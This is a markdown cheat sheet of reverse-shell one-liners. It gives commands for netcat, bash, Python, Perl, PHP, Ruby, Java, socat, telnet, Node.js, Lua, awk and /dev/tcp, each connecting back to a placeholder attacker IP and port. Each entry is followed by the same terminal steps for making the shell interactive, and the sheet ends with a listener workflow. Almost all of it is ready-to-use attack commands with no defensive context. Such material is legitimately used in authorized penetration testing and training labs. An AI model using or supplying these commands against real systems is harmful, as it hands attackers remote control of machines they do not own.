# Reverse Shell Methods and Making Them Interactive


## 1. **Netcat (nc)**
### Netcat with `-e` option
```sh
nc -e /bin/sh <attacker_ip> <port>
```
### Netcat without `-e` option
```sh
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> <port> > /tmp/f
```
### Making Netcat Shell Interactive
```sh
# Press Ctrl+Z to background the shell
stty raw -echo; fg
export TERM=xterm
stty rows <num> columns <num>
```

## 2. **Bash**
### Bash TCP Reverse Shell
```sh
bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1
```
### Bash UDP Reverse Shell
```sh
sh -i >& /dev/udp/<attacker_ip>/<port> 0>&1
```
### Making Bash Shell Interactive
```sh
# Press Ctrl+Z to background the shell
stty raw -echo; fg
export TERM=xterm
stty rows <num> columns <num>
```

## 3. **Python**
### Python 2 Reverse Shell
```sh
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```
### Python 3 Reverse Shell
```sh
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```
### Making Python Shell Interactive
```sh
# Press Ctrl+Z to background the shell
stty raw -echo; fg
export TERM=xterm
stty rows <num> columns <num>
```

## 4. **Perl**
### Perl Reverse Shell
```sh
perl -e 'use Socket;$i="<attacker_ip>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
### Making Perl Shell Interactive
```sh
# Press Ctrl+Z to background the shell
stty raw -echo; fg
export TERM=xterm
stty rows <num> columns <num>
```

## 5. **PHP**
### PHP Reverse Shell
```php
php -r '$sock=fsockopen("<attacker_ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'
```
### Making PHP Shell Interactive
```sh
# Press Ctrl+Z to background the shell
stty raw -echo; fg
export TERM=xterm
stty rows <num> columns <num>
```

## 6. **Ruby**
### Ruby Reverse Shell
```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<attacker_ip>","<port>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
### Making Ruby Shell Interactive
```sh
# Press Ctrl+Z to background the shell
stty raw -echo; fg
export TERM=xterm
stty rows <num> columns <num>
```

## 7. **Java**
### Java Reverse Shell
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<attacker_ip>/<port>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
### Making Java Shell Interactive
```sh
# Press Ctrl+Z to background the shell
stty raw -echo; fg
export TERM=xterm
stty rows <num> columns <num>
```

## 8. **Socat**
### Socat Reverse Shell
```sh
socat TCP:<attacker_ip>:<port> EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
```
### Making Socat Shell Interactive
```sh
# Press Ctrl+Z to background the shell
stty raw -echo; fg
export TERM=xterm
stty rows <num> columns <num>
```

## 9. **Telnet**
### Telnet Reverse Shell
```sh
rm -f /tmp/p; mknod /tmp/p p && telnet <attacker_ip> <port> 0/tmp/p
```
### Making Telnet Shell Interactive
```sh
# Press Ctrl+Z to background the shell
stty raw -echo; fg
export TERM=xterm
stty rows <num> columns <num>
```

## 10. **Node.js**
### Node.js Reverse Shell
```js
require('child_process').exec('nc -e /bin/sh <attacker_ip> <port>')
```
### Making Node.js Shell Interactive
```sh
# Press Ctrl+Z to background the shell
stty raw -echo; fg
export TERM=xterm
stty rows <num> columns <num>
```

## 11. **Lua**
### Lua Reverse Shell
```lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('<attacker_ip>','<port>');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```
### Making Lua Shell Interactive
```sh
# Press Ctrl+Z to background the shell
stty raw -echo; fg
export TERM=xterm
stty rows <num> columns <num>
```

## 12. **Awk**
### Awk Reverse Shell
```sh
awk 'BEGIN {s = "/inet/tcp/0/<attacker_ip>/<port>"; while (1) { do { printf "shell> " |& s; s |& getline c; if (c) while ((c |& getline) > 0) print $0 |& s; close(c) } while (c != "exit") close(s) }}'
```
### Making Awk Shell Interactive
```sh
# Press Ctrl+Z to background the shell
stty raw -echo; fg
export TERM=xterm
stty rows <num> columns <num>
```

## 13. **/dev/tcp**
### /dev/tcp Reverse Shell
```sh
/bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'
```
### Making /dev/tcp Shell Interactive
```sh
# Press Ctrl+Z to background the shell
stty raw -echo; fg
export TERM=xterm
stty rows <num> columns <num>
```

## Example Workflow
1. **Setup listener on attacker machine:**
   ```sh
   nc -lvnp <port>
   ```
2. **Run reverse shell command on target machine.**

## Notes
- Replace `10.17.87.142` with your attack machine's IP address.
- Replace `4444` with the port number you are listening on.
- Ensure to background the shell and fix terminal settings for an interactive shell:
  ```sh
  # Press Ctrl+Z to background the shell
  stty raw -echo; fg
  export TERM=xterm
  stty rows 25 columns 80
  ```